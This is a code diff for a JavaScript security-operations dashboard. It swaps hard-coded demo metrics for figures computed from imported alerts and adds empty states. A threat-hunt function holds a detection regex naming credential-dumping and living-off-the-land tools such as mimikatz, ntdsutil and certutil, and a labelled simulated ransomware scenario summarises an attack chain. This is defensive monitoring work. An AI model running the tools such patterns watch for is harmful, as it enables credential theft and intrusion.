-              {cat:'Execution',count:38,pct:13,color:'#ff9100'},
-              {cat:'Initial Access',count:35,pct:12,color:'#ffd600'},
-              {cat:'Lateral Movement',count:32,pct:11,color:'#00e676'},
-              {cat:'Command & Control',count:28,pct:10,color:'#00e5ff'},
-              {cat:'Persistence',count:25,pct:9,color:'#7c4dff'},
-              {cat:'Defense Evasion',count:22,pct:8,color:'#e040fb'},
-              {cat:'Exfiltration',count:18,pct:6,color:'#ff6e40'},
-              {cat:'Discovery',count:15,pct:5,color:'#69f0ae'},
-              {cat:'Collection',count:12,pct:4,color:'#40c4ff'},
-              {cat:'Other',count:14,pct:5,color:'var(--mut)'},
-            ].map(function(c2) {
-              return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
-                '<span style="min-width:110px;color:var(--mut)">' + esc(c2.cat) + '</span>' +
-                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + c2.pct*4 + '%;background:' + c2.color + '"></div></div>' +
-                '<span style="min-width:35px;text-align:right;font-weight:600">' + c2.count + '</span>' +
-                '<span style="min-width:25px;text-align:right;color:var(--mut)">' + c2.pct + '%</span>' +
-              '</div>';
-            }).join('') +
+            (analysts.length ?
+            '<table class="ct-tbl">' +
+              '<thead><tr><th>Analyst</th><th>Open</th><th>Resolved</th><th>Avg Resolution</th></tr></thead>' +
+              '<tbody>' +
+                analysts.map(function(a) {
+                  var avg = a.times.length ? Math.round(a.times.reduce(function(s,v){return s+v;},0) / a.times.length / 60000) : null;
+                  return '<tr>' +
+                    '<td>' + esc(a.name) + '</td>' +
+                    '<td style="font-weight:600">' + a.open + '</td>' +
+                    '<td style="color:#00e676;font-weight:600">' + a.closed + '</td>' +
+                    '<td>' + (avg === null ? '&mdash;' : avg + ' min') + '</td>' +
+                  '</tr>';
+                }).join('') +
+              '</tbody>' +
+            '</table>' : '<div class="ct-empty">No alerts assigned yet. Assign alerts in Alert Triage.</div>') +
           '</div>' +
         '</div>' +
 
         '<div class="ct-panel">' +
           '<div class="ct-panel-h">Top Targeted Assets</div>' +
           '<div class="ct-panel-b">' +
+            (assetKeys.length ?
             '<table class="ct-tbl">' +
-              '<thead><tr><th>Asset</th><th>Type</th><th>Alerts</th><th>Critical</th><th>Risk Score</th></tr></thead>' +
+              '<thead><tr><th>Asset</th><th>Alerts</th><th>Critical</th></tr></thead>' +
               '<tbody>' +
-                [
-                  {asset:'10.0.2.100 (WS-JSMITH-01)',type:'Workstation',alerts:45,crit:8,risk:95},
-                  {asset:'DC-01.corp.local',type:'Domain Controller',alerts:28,crit:5,risk:92},
-                  {asset:'FS-01.corp.local',type:'File Server',alerts:15,crit:2,risk:78},
-                  {asset:'10.0.1.20 (web-prod-01)',type:'Web Server',alerts:12,crit:1,risk:65},
-                  {asset:'AWS Account (prod)',type:'Cloud',alerts:8,crit:3,risk:88},
-                  {asset:'10.0.2.150',type:'Workstation',alerts:5,crit:1,risk:72},
-                  {asset:'10.0.3.75',type:'Workstation',alerts:4,crit:0,risk:35},
-                  {asset:'k8s-master',type:'Container',alerts:3,crit:0,risk:42},
-                ].map(function(a) {
+                assetKeys.map(function(k) {
+                  var a = m.assets[k];
                   return '<tr>' +
                     '<td style="font-size:.62rem;font-weight:600">' + esc(a.asset) + '</td>' +
-                    '<td><span class="ct-tag">' + esc(a.type) + '</span></td>' +
                     '<td style="font-weight:600">' + a.alerts + '</td>' +
                     '<td style="color:#ff1744;font-weight:600">' + a.crit + '</td>' +
-                    '<td><div class="ct-gauge" style="width:60px;display:inline-block;vertical-align:middle;margin-right:4px"><div class="ct-gauge-fill" style="width:' + a.risk + '%;background:' + (a.risk>=80?'#ff1744':a.risk>=60?'#ff9100':'#ffd600') + '"></div></div><span style="font-size:.6rem;font-weight:600;color:' + (a.risk>=80?'#ff1744':a.risk>=60?'#ff9100':'#ffd600') + '">' + a.risk + '</span></td>' +
                   '</tr>';
                 }).join('') +
               '</tbody>' +
-            '</table>' +
+            '</table>' : '<div class="ct-empty">No hosts or IPs recorded on your alerts.</div>') +
           '</div>' +
         '</div>' +
       '</div>' +
 
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">Executive Summary Report</div>' +
+      '<div class="ct-panel">' +
+        '<div class="ct-panel-h">Summary Report</div>' +
         '<div class="ct-panel-b">' +
           '<div class="ct-yaml">' +
-            'SOC EXECUTIVE SUMMARY - ' + new Date().toISOString().split('T')[0] + '\n' +
+            'SOC SUMMARY - ' + new Date().toISOString().split('T')[0] + '\n' +
             '========================================================\n\n' +
-            'THREAT LANDSCAPE:\n' +
-            '  Active Incidents: 4 (3 Critical, 1 High)\n' +
-            '  Primary Threat: Advanced persistent attacker leveraging\n' +
-            '    Cobalt Strike for C2, lateral movement via pass-the-hash,\n' +
-            '    credential dumping with Mimikatz, data exfiltration (450MB)\n' +
-            '  Attack Attribution: TTP alignment with APT29 (Cozy Bear)\n' +
-            '  Dwell Time: Estimated 45 minutes (08:01 - 08:45)\n\n' +
-            'SOC PERFORMANCE:\n' +
-            '  Alerts Processed (24h): ' + m.alertVolume.today + '\n' +
-            '  Critical/High Alerts: ' + ALERTS.filter(function(a){return a.severity==='Critical'||a.severity==='High'}).length + '\n' +
-            '  Mean Time to Detect: ' + m.mttd.current + ' min (target: ' + m.mttd.target + ' min)\n' +
-            '  Mean Time to Respond: ' + m.mttr.current + ' min (target: ' + m.mttr.target + ' min)\n' +
-            '  False Positive Rate: ' + m.falsePositiveRate.current + '% (target: ' + m.falsePositiveRate.target + '%)\n\n' +
-            'CONTAINMENT ACTIONS TAKEN:\n' +
-            '  [X] WS-JSMITH-01 isolated from network\n' +
-            '  [X] C2 IP 45.33.32.156 blocked at perimeter\n' +
-            '  [X] Exfil destination 198.51.100.50 blocked\n' +
-            '  [X] Compromised svc-admin password reset\n' +
-            '  [X] Audit log backup verified and restored\n' +
-            '  [ ] AWS backdoor user deletion (pending)\n' +
-            '  [ ] S3 bucket policy audit (pending)\n' +
-            '  [ ] Full forensic analysis (in progress)\n\n' +
-            'RECOMMENDATIONS:\n' +
-            '  1. Enforce MFA for all service accounts\n' +
-            '  2. Implement LAPS for local admin passwords\n' +
-            '  3. Deploy application whitelisting on DCs\n' +
-            '  4. Review and restrict PowerShell execution policies\n' +
-            '  5. Enable advanced audit logging on all DCs\n' +
-            '  6. Conduct tabletop exercise for IR team' +
+            '  Total Alerts: ' + m.total + '\n' +
+            '  Critical/High Alerts: ' + crit + '\n' +
+            '  Open: ' + m.open + ' (critical open: ' + m.criticalOpen + ')\n' +
+            '  Resolved: ' + m.closed + (m.fp ? ' (' + m.fp + ' false positive)' : '') + '\n' +
+            '  Mean Time to Respond: ' + (m.mttr === null ? 'n/a' : m.mttr + ' min') + '\n' +
+            '  False Positive Rate: ' + (m.fpRate === null ? 'n/a' : m.fpRate + '%') + '\n' +
+            '  Escalation Rate: ' + (m.escalationRate === null ? 'n/a' : m.escalationRate + '%') + '\n' +
+            (tacticKeys.length ? '  Top Tactic: ' + esc(tacticKeys[0]) + ' (' + m.tactics[tacticKeys[0]] + ')\n' : '') +
+            (assetKeys.length ? '  Most-Targeted Asset: ' + esc(assetKeys[0]) + ' (' + m.assets[assetKeys[0]].alerts + ' alerts)\n' : '') +
           '</div>' +
-          '<div style="display:flex;gap:8px;margin-top:10px">' +
-            '<button class="ct-btn">Export PDF</button>' +
-            '<button class="ct-btn ct-btn-ghost">Email to Management</button>' +
-            '<button class="ct-btn ct-btn-ghost">Schedule Auto-Report</button>' +
-          '</div>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-grid2" style="margin-top:12px">' +
-        '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Incident Response Metrics</div>' +
-          '<div class="ct-panel-b">' +
-            '<table class="ct-tbl">' +
-              '<thead><tr><th>Metric</th><th>This Week</th><th>Last Week</th><th>Change</th></tr></thead>' +
-              '<tbody>' +
-                [
-                  {metric:'Total Incidents',curr:8,prev:5,good:'down'},
-                  {metric:'Critical Incidents',curr:4,prev:2,good:'down'},
-                  {metric:'Avg Containment Time',curr:'42 min',prev:'55 min',good:'down'},
-                  {metric:'Avg Recovery Time',curr:'4.2 hrs',prev:'6.8 hrs',good:'down'},
-                  {metric:'Incidents from Hunts',curr:3,prev:1,good:'up'},
-                  {metric:'Repeat Incidents',curr:1,prev:3,good:'down'},
-                  {metric:'External Reports Filed',curr:2,prev:0,good:'NA'},
-                  {metric:'Lessons Learned Done',curr:3,prev:4,good:'up'},
-                ].map(function(m) {
-                  var currVal = typeof m.curr === 'number' ? m.curr : m.curr;
-                  var prevVal = typeof m.prev === 'number' ? m.prev : m.prev;
-                  var diff = typeof m.curr === 'number' && typeof m.prev === 'number' ? m.curr - m.prev : null;
-                  var changeColor = diff === null ? 'var(--mut)' : (diff > 0 && m.good === 'down') || (diff < 0 && m.good === 'up') ? '#ff1744' : (diff < 0 && m.good === 'down') || (diff > 0 && m.good === 'up') ? '#00e676' : 'var(--mut)';
-                  var changeText = diff === null ? '--' : (diff > 0 ? '+' : '') + diff;
-                  return '<tr>' +
-                    '<td style="font-weight:600">' + esc(m.metric) + '</td>' +
-                    '<td>' + currVal + '</td>' +
-                    '<td style="color:var(--mut)">' + prevVal + '</td>' +
-                    '<td style="color:' + changeColor + ';font-weight:600">' + changeText + '</td>' +
-                  '</tr>';
-                }).join('') +
-              '</tbody>' +
-            '</table>' +
-          '</div>' +
-        '</div>' +
-
-        '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Risk Score by Business Unit</div>' +
-          '<div class="ct-panel-b">' +
-            [
-              {unit:'Finance',score:82,trend:'up',alerts:34,critAssets:5},
-              {unit:'Engineering',score:45,trend:'down',alerts:89,critAssets:12},
-              {unit:'Human Resources',score:68,trend:'up',alerts:18,critAssets:3},
-              {unit:'Executive',score:71,trend:'stable',alerts:8,critAssets:2},
-              {unit:'Sales',score:38,trend:'down',alerts:15,critAssets:1},
-              {unit:'IT Operations',score:55,trend:'down',alerts:62,critAssets:8},
-              {unit:'Legal/Compliance',score:25,trend:'down',alerts:5,critAssets:1},
-              {unit:'Marketing',score:18,trend:'stable',alerts:3,critAssets:0},
-            ].map(function(bu) {
-              var riskColor = bu.score>=70?'#ff1744':bu.score>=50?'#ff9100':bu.score>=30?'#ffd600':'#00e676';
-              return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:.62rem">' +
-                '<span style="min-width:100px;font-weight:600">' + esc(bu.unit) + '</span>' +
-                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + bu.score + '%;background:' + riskColor + '"></div></div>' +
-                '<span style="min-width:25px;text-align:right;font-weight:600;color:' + riskColor + '">' + bu.score + '</span>' +
-                '<span style="min-width:40px;text-align:right;color:var(--mut)">' + bu.alerts + ' alerts</span>' +
-                '<span style="min-width:15px;text-align:right;color:' + (bu.trend==='up'?'#ff1744':bu.trend==='down'?'#00e676':'var(--mut)') + '">' + (bu.trend==='up'?'^':bu.trend==='down'?'v':'-') + '</span>' +
-              '</div>';
-            }).join('') +
-            '<div style="margin-top:8px;font-size:.55rem;color:var(--mut)">Risk score combines alert volume, critical asset exposure, vulnerability count, and compliance gaps</div>' +
-          '</div>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">Weekly SOC Performance Summary</div>' +
-        '<div class="ct-panel-b">' +
-          '<div class="ct-grid4">' +
-            [
-              {label:'Detection Efficacy',value:'82%',color:m.mttd.current<=m.mttd.target?'#00e676':'#ff9100',detail:'Rules detecting real threats'},
-              {label:'Coverage Score',value:'73%',color:'#ffd600',detail:'MITRE techniques covered'},
-              {label:'Automation Rate',value:'35%',color:'#00e5ff',detail:'Alerts auto-remediated'},
-              {label:'Threat Intel Usage',value:'68%',color:'#7c4dff',detail:'IOCs from feeds matched'},
-              {label:'Tool Integration',value:'92%',color:'#00e676',detail:'Log sources connected'},
-              {label:'Analyst Utilization',value:'78%',color:'#ff9100',detail:'Analyst time on investigations'},
-              {label:'Customer Impact',value:'0',color:'#00e676',detail:'Customer-facing incidents'},
-              {label:'Regulatory Events',value:'2',color:'#ff1744',detail:'Events requiring notification'},
-            ].map(function(s) {
-              return '<div class="ct-stat">' +
-                '<div class="ct-stat-v" style="color:' + s.color + '">' + s.value + '</div>' +
-                '<div class="ct-stat-l">' + esc(s.label) + '</div>' +
-                '<div style="font-size:.5rem;color:var(--mut);margin-top:2px">' + esc(s.detail) + '</div>' +
-              '</div>';
-            }).join('') +
-          '</div>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">Detection Rule Performance (Last 30 Days)</div>' +
-        '<div class="ct-panel-b" style="max-height:300px;overflow-y:auto">' +
-          '<table class="ct-tbl">' +
-            '<thead><tr><th>Rule</th><th>Triggers</th><th>True Pos</th><th>False Pos</th><th>TP Rate</th><th>Avg Time</th><th>Trend</th></tr></thead>' +
-            '<tbody>' +
-              [
-                {name:'SSH Brute Force',triggers:156,tp:142,fp:14,avgTime:'2.1m',trend:[8,12,15,18,22,25,20,18,15,12]},
-                {name:'SQL Injection',triggers:89,tp:78,fp:11,avgTime:'1.5m',trend:[5,8,12,15,10,8,6,8,10,7]},
-                {name:'Encoded PowerShell',triggers:45,tp:38,fp:7,avgTime:'3.2m',trend:[2,3,5,4,6,5,4,5,6,5]},
-                {name:'New Admin Account',triggers:12,tp:10,fp:2,avgTime:'4.5m',trend:[0,1,2,1,0,1,2,1,2,2]},
-                {name:'C2 Beacon Pattern',triggers:28,tp:25,fp:3,avgTime:'5.8m',trend:[1,2,3,2,4,3,2,3,4,4]},
-                {name:'Mass File Access',triggers:34,tp:22,fp:12,avgTime:'2.8m',trend:[3,4,2,5,3,4,2,5,3,3]},
-                {name:'DNS Tunneling',triggers:18,tp:15,fp:3,avgTime:'6.1m',trend:[1,1,2,2,3,2,1,2,2,2]},
-                {name:'Kerberoasting',triggers:23,tp:20,fp:3,avgTime:'4.2m',trend:[1,2,2,3,2,3,2,2,3,3]},
-                {name:'Ransomware Behavior',triggers:5,tp:5,fp:0,avgTime:'0.8m',trend:[0,0,1,0,0,1,0,0,1,2]},
-                {name:'Audit Log Cleared',triggers:8,tp:7,fp:1,avgTime:'1.2m',trend:[0,1,1,0,0,1,1,1,2,1]},
-                {name:'Pass-the-Hash',triggers:15,tp:12,fp:3,avgTime:'3.5m',trend:[1,1,2,1,2,1,2,1,2,2]},
-                {name:'LOLBin Execution',triggers:67,tp:45,fp:22,avgTime:'2.5m',trend:[5,6,7,8,6,7,5,8,7,8]},
-                {name:'Impossible Travel',triggers:42,tp:28,fp:14,avgTime:'8.2m',trend:[3,4,5,4,5,4,3,4,5,5]},
-                {name:'Container Escape',triggers:3,tp:2,fp:1,avgTime:'12.0m',trend:[0,0,0,0,1,0,0,0,1,1]},
-                {name:'Honeypot Interaction',triggers:19,tp:19,fp:0,avgTime:'1.0m',trend:[1,2,2,1,2,3,2,1,3,2]},
-              ].map(function(r) {
-                var tpRate = Math.round((r.tp / r.triggers) * 100);
-                var maxTrigger = 156;
-                return '<tr>' +
-                  '<td style="font-weight:600;font-size:.62rem">' + esc(r.name) + '</td>' +
-                  '<td>' + r.triggers + '</td>' +
-                  '<td style="color:#00e676">' + r.tp + '</td>' +
-                  '<td style="color:' + (r.fp > 10 ? '#ff1744' : r.fp > 5 ? '#ff9100' : '#ffd600') + '">' + r.fp + '</td>' +
-                  '<td style="font-weight:600;color:' + (tpRate >= 90 ? '#00e676' : tpRate >= 75 ? '#ffd600' : '#ff9100') + '">' + tpRate + '%</td>' +
-                  '<td style="color:var(--mut)">' + r.avgTime + '</td>' +
-                  '<td><div class="ct-sparkline">' + r.trend.map(function(v) {
-                    var h = Math.max(2, Math.round((v / 25) * 20));
-                    return '<div class="ct-spark-bar" style="height:' + h + 'px"></div>';
-                  }).join('') + '</div></td>' +
-                '</tr>';
-              }).join('') +
-            '</tbody>' +
-          '</table>' +
         '</div>' +
       '</div>';
   }
@@ -3360,6 +3176,12 @@ export function renderCitadel(main) {
         '<div style="display:flex;justify-content:space-between;font-size:.62rem;margin-bottom:3px"><span style="color:var(--txt)">' + esc(label) + '</span><span style="font-variant-numeric:tabular-nums;color:var(--mut)">' + count + ' (' + pct + '%)</span></div>' +
         '<div class="ct-gauge"><div class="ct-gauge-fill" style="width:' + pct + '%;background:' + color + '"></div></div>' +
       '</div>';
+    }
+
+    if (!total) {
+      c.innerHTML = ctEmptyState('No alerts yet. Paste or upload logs to triage them.', 'Import logs', 'logs');
+      wireEmptyActions(c);
+      return;
     }
 
     c.innerHTML =
@@ -3416,11 +3238,17 @@ export function renderCitadel(main) {
     var inc = incidents[selectedIncident];
     var sevBadge = {Critical:'ct-crit',High:'ct-high',Medium:'ct-med',Low:'ct-low'};
 
+    if (!ALERTS.length) {
+      c.innerHTML = ctEmptyState('No incidents yet. Incidents are correlated automatically from your alerts; import logs to get started.', 'Import logs', 'logs');
+      wireEmptyActions(c);
+      return;
+    }
+
     c.innerHTML =
       '<div class="ct-filter-row" style="margin-bottom:8px">' +
         '<span style="color:var(--mut);font-size:.65rem">' + ALERTS.length + ' alerts correlated into ' + incidents.length + ' incidents (' + multi.length + ' multi-alert, ' + singles + ' standalone) &middot; grouped by shared host/IP within 60m</span>' +
         '<span style="flex:1"></span>' +
-        (inc ? '<button class="ct-btn ct-btn-sm" id="ct-inc-graph" title="Demo alert data is tagged simulated">Send incident to Security Graph</button>' : '') +
+        (inc ? '<button class="ct-btn ct-btn-sm" id="ct-inc-graph" title="Alerts from the example dataset are tagged simulated">Send incident to Security Graph</button>' : '') +
       '</div>' +
       '<div class="ct-grid2">' +
         '<div class="ct-panel">' +
@@ -3484,7 +3312,7 @@ export function renderCitadel(main) {
   // ========== MITRE ATT&CK MATRIX ==========
   function renderAttackMatrix(c) {
     var byTech = {};
-    ALERTS.forEach(function(a){ (byTech[a.mitre] = byTech[a.mitre] || []).push(a); });
+    ALERTS.forEach(function(a){ if (a.mitre) (byTech[a.mitre] = byTech[a.mitre] || []).push(a); });
     var techIds = Object.keys(byTech);
     var byTactic = {};
     techIds.forEach(function(id) {
@@ -3498,6 +3326,7 @@ export function renderCitadel(main) {
     var sevBadge = {Critical:'ct-crit',High:'ct-high',Medium:'ct-med',Low:'ct-low'};
 
     c.innerHTML =
+      (techIds.length ? '' : ctEmptyState('No ATT&CK-mapped alerts yet. Alerts appear here once they carry a technique ID (for example T1110).', 'Import logs', 'logs')) +
       '<div class="ct-grid4" style="margin-bottom:10px">' +
         '<div class="ct-stat"><div class="ct-stat-v">' + techIds.length + '</div><div class="ct-stat-l">Techniques Observed</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v">' + cols.length + ' / ' + CT_TACTIC_ORDER.length + '</div><div class="ct-stat-l">Tactics Covered</div></div>' +
@@ -3554,6 +3383,7 @@ export function renderCitadel(main) {
         renderAttackMatrix(c);
       };
     });
+    wireEmptyActions(c);
   }
 
   // ========== DETECTION RULE TESTER ==========
@@ -3726,7 +3556,9 @@ export function renderCitadel(main) {
     var suspChild = /(powershell|cmd\.exe|nltest|dsquery|net\.exe|whoami|certutil|rundll32|ntdsutil|mimikatz|wmic|regsvr32)/i;
     var suspParent = /(services\.exe|cmd\.exe|powershell\.exe|wscript|cscript|winword|excel|outlook)/i;
     var hits = [];
-    WINDOWS_EVENTS.forEach(function(e) {
+    getAllLogs().forEach(function(l) {
+      if (l.format !== 'windows') return;
+      var e = l.data;
       var d = e.data || {};
       var parent = d.ParentProcessName || d.ParentImage || '';
       var child = d.NewProcessName || d.Image || '';
@@ -3743,14 +3575,18 @@ export function renderCitadel(main) {
   function ctHuntNewGeo() {
     var foreign = /(\bRU\b|\bCN\b|Russia|Moscow|Beijing|China)/i;
     var hits = [];
-    JSON_LOGS.forEach(function(e) {
+    getAllLogs().forEach(function(l) {
+      if (l.format !== 'json') return;
+      var e = l.data;
       var d = e.data || {}, geo = '', user = '', ip = '';
       if (e.source === 'azure-signin' && d.location) { geo = (d.location.countryOrRegion || '') + ' / ' + (d.location.city || ''); user = d.userPrincipalName; ip = d.ipAddress; }
       else if (e.source === 'okta-syslog' && d.client && d.client.geographicalContext) { var g = d.client.geographicalContext; geo = (g.country || '') + ' / ' + (g.city || ''); user = d.actor && d.actor.alternateId; ip = d.client.ipAddress; }
       else if (e.source === 'duo-auth' && d.location) { geo = (d.location.country || '') + ' / ' + (d.location.city || ''); user = d.username; ip = d.ip; }
       if (geo && foreign.test(geo)) hits.push({ts:e.ts, user:user || '-', ip:ip || '-', geo:geo, source:e.source});
     });
-    LEEF_LOGS.forEach(function(e) {
+    getAllLogs().forEach(function(l) {
+      if (l.format !== 'leef') return;
+      var e = {ts:l.ts, raw:l.raw};
       if (/ImpossibleTravel|Beijing|Moscow/i.test(e.raw)) {
         var m = e.raw.match(/usrName=([^\t]+)/); var s = e.raw.match(/src=([^\t]+)/);
         hits.push({ts:e.ts, user:(m && m[1]) || '-', ip:(s && s[1]) || '-', geo:'Impossible travel', source:'QRadar'});
@@ -3799,6 +3635,7 @@ export function renderCitadel(main) {
     }).join('');
 
     c.innerHTML =
+      (logs.length ? '' : ctEmptyState('No telemetry yet. Paste or upload logs to map your sources and run hunts over them.', 'Import logs', 'logs')) +
       '<div class="ct-panel" style="border-color:var(--mode-accent,#f59e0b)">' +
         '<div class="ct-panel-h" style="color:var(--mode-accent,#f59e0b)">Telemetry Reconnaissance &middot; Scouting Posture</div>' +
         '<div class="ct-panel-b" style="font-size:.72rem;color:var(--mut);line-height:1.6">' +
@@ -3887,6 +3724,7 @@ export function renderCitadel(main) {
       runHunt();
     };
     runHunt();
+    wireEmptyActions(c);
   }
 
   // ========== OFFENSIVE — SIMULATED PURPLE-TEAM ADVERSARY EMULATION ==========
@@ -3903,7 +3741,7 @@ export function renderCitadel(main) {
     return DETECTION_RULES.filter(function(r){ return r.enabled && ctTechMatch(r.mitre, mitre); });
   }
   var CT_SCENARIOS = [
-    {id:'ransom', name:'Ransomware Intrusion — WS-JSMITH-01 (10.0.2.100)',
+    {id:'ransom', name:'Ransomware Intrusion — WS-USER1-01 (10.0.2.100)',
      summary:'Emotet loader to Cobalt Strike C2, encoded PowerShell, LSASS/Mimikatz credential theft, Pass-the-Hash and Kerberoasting, domain persistence, SMB lateral movement, mass collection, exfiltration and ransomware detonation.',
      alertIds:['ALT-025','ALT-003','ALT-004','ALT-027','ALT-012','ALT-021','ALT-010','ALT-005','ALT-013','ALT-014','ALT-020','ALT-015','ALT-007','ALT-009','ALT-006'],
      gaps:[{mitre:'T1566.001', tactic:'Initial Access', name:'Phishing: Spearphishing Attachment'},
@@ -3920,7 +3758,7 @@ export function renderCitadel(main) {
   function ctBuildScenarioSteps(scn) {
     var steps = [];
     scn.alertIds.forEach(function(id) {
-      var a = ALERTS.filter(function(x){ return x.id === id; })[0];
+      var a = EXAMPLE_ALERTS.filter(function(x){ return x.id === id; })[0];
       if (!a) return;
       var info = ctTechInfo(a.mitre);
       steps.push({mitre:a.mitre, tactic:info.tactic, name:info.name, action:a.title, alert:a, gap:false});
@@ -3962,7 +3800,7 @@ export function renderCitadel(main) {
         '<div class="ct-panel-h" style="color:var(--mode-accent,#dc2626)">Adversary Emulation &middot; Purple-Team Detection Coverage</div>' +
         '<div class="ct-panel-b">' +
           '<div style="display:inline-block;padding:2px 8px;border-radius:2px;font-size:.6rem;font-weight:700;letter-spacing:.05em;background:rgba(255,23,68,.15);color:#ff1744;border:1px solid rgba(255,23,68,.4);margin-bottom:8px">SIMULATION ONLY</div>' +
-          '<div style="font-size:.72rem;color:var(--mut);line-height:1.6">This is a tabletop purple-team exercise. It reconstructs an attack chain from the existing MITRE-tagged alert queue and reports, per kill-chain step, whether our detections would fire or MISS it. No live attack is performed and no network activity occurs — it reasons over recorded telemetry to expose detection-coverage gaps.</div>' +
+          '<div style="font-size:.72rem;color:var(--mut);line-height:1.6">This is a tabletop purple-team exercise on a fictional example dataset (not your alerts). It reconstructs an attack chain from MITRE-tagged example alerts and reports, per kill-chain step, whether our detections would fire or MISS it. No live attack is performed and no network activity occurs — it reasons over recorded telemetry to expose detection-coverage gaps.</div>' +
         '</div>' +
       '</div>' +
 
